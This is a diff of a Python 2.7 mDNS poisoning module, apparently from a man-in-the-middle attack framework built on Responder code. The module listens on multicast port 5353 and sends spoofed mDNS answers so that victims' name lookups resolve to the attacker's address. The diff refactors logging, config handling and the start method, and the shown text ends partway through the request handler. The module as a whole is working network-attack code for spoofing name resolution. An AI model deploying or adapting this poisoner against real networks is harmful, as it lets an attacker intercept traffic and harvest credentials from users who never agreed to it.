@@ -1,22 +1,33 @@
 #! /usr/bin/env python2.7
 
-from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
 import threading
+import socket
 import struct
+import logging
 
-from core.protocols.odict import OrderedDict
-from core.protocols.packet import Packet
+from SocketServer import UDPServer, ThreadingMixIn, BaseRequestHandler
+from core.configwatcher import ConfigWatcher
+from core.responder.odict import OrderedDict
+from core.responder.packet import Packet
+from core.responder.common import *
+
+mitmf_logger = logging.getLogger("mitmf")
 
 class MDNSPoisoner():
 
-	def start():
+	def start(self, options, ourip):
+		
+		global args; args = options
+		global OURIP; OURIP = ourip
+
 		try:
+			mitmf_logger.debug("[MDNSPoisoner] OURIP => {}".format(OURIP))
 			server = ThreadingUDPMDNSServer(("0.0.0.0", 5353), MDNS)
-			t = threading.Thread(name="MDNS", target=server.serve_forever)
+			t = threading.Thread(name="MDNSPoisoner", target=server.serve_forever)
 			t.setDaemon(True)
 			t.start()
 		except Exception, e:
-			print "Error starting MDNSPoisoner on port %s: %s:" % (str(port),str(e))
+			print "[MDNSPoisoner] Error starting on port 5353: {}" .format(e)
 
 class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
 
@@ -26,9 +37,8 @@ class ThreadingUDPMDNSServer(ThreadingMixIn, UDPServer):
 		MADDR = "224.0.0.251"
 		self.socket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 		self.socket.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 255)
-		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP,inet_aton(MADDR)+inet_aton(OURIP))
-
-		UDPServer.server_bind(self
+		Join = self.socket.setsockopt(socket.IPPROTO_IP,socket.IP_ADD_MEMBERSHIP, socket.inet_aton(MADDR)+ socket.inet_aton(OURIP))
+		UDPServer.server_bind(self)
 
 class MDNSAns(Packet):
 	fields = OrderedDict([
@@ -67,32 +77,34 @@ def Poisoned_MDNS_Name(data):
 class MDNS(BaseRequestHandler):
 
 	def handle(self):
+
+		ResponderConfig = ConfigWatcher.getInstance().getConfig()['Responder']
+		RespondTo       = ResponderConfig['RespondTo']
+
 		MADDR = "224.0.0.251"
 		MPORT = 5353
 		data, soc = self.request
 		if self.client_address[0] == "127.0.0.1":
 			pass
 		try:
-			if AnalyzeMode:
+			if args.analyze:
 				if Parse_IPV6_Addr(data):
-					#print '[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data))
-					responder_logger.info('[Analyze mode: MDNS] Host: %s is looking for : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
+					mitmf_logger.info('[MDNSPoisoner] {} is looking for: {}'.format(self.client_address[0],Parse_MDNS_Name(data)))
 
 			if RespondToSpecificHost(RespondTo):
-				if AnalyzeMode == False:
+				if args.analyze == False:
 					if RespondToIPScope(RespondTo, self.client_address[0]):
 						if Parse_IPV6_Addr(data):
-							#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
-							responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
+
+							mitmf_logger.info('[MDNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0],Parse_MDNS_Name(data)))
 							Name = Poisoned_MDNS_Name(data)
 							MDns = MDNSAns(AnswerName = Name)
 							MDns.calculate()
 							soc.sendto(str(MDns),(MADDR,MPORT))
 
-			if AnalyzeMode == False and RespondToSpecificHost(RespondTo) == False:
+			if args.analyze == False and RespondToSpecificHost(RespondTo) == False:
 				if Parse_IPV6_Addr(data):
-					#print 'MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data))
-					responder_logger.info('MDNS poisoned answer sent to this IP: %s. The requested name was : %s'%(self.client_address[0],Parse_MDNS_Name(data)))
+					mitmf_logger.info('[MDNSPoisoner] Poisoned answer sent to {} the requested name was: {}'.format(self.client_address[0],Parse_MDNS_Name(data)))
 					Name = Poisoned_MDNS_Name(data)
 					MDns = MDNSAns(AnswerName = Name)
 					MDns.calculate()
